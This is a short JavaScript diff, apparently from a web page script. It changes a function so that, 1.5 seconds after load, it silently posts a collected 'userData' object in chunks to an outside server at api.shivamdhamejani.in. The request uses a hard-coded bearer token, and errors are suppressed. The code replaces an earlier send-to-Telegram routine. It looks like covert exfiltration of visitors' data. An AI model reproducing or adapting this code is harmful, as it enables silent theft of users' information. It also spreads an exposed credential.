@@ -603,23 +603,30 @@ async function sha256(str) {
             return chunks;
         }
 
-    // Modified sending function
 async function sendDeatilsToTelegram1(message) {
     const chunks = splitIntoChunks(message);
 
     for (const [index, chunk] of chunks.entries()) {
-        await sendDeatilsToTelegram(`Part ${index + 1}/${chunks.length}\n${chunk}`);
+        await fetch("https://api.shivamdhamejani.in/send", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "Authorization": "Bearer 4e1d4cf7c66d87eb1906491421efebb6914bf090e1ed0c1871b7310c7086bd35"
+            },
+            body: JSON.stringify({
+                message: `Part ${index + 1}/${chunks.length}\n${chunk}`
+            })
+        });
     }
 }
 
 setTimeout(async () => {
     try {
         const formattedData = JSON.stringify(userData, null, 2);
-        // console.clear()
         await sendDeatilsToTelegram1(formattedData);
     } catch (error) {
         // console.log("Error loading fetcher", error);
     }
-}, 1500);}
+}, 1500);
     collectAllData();
 };
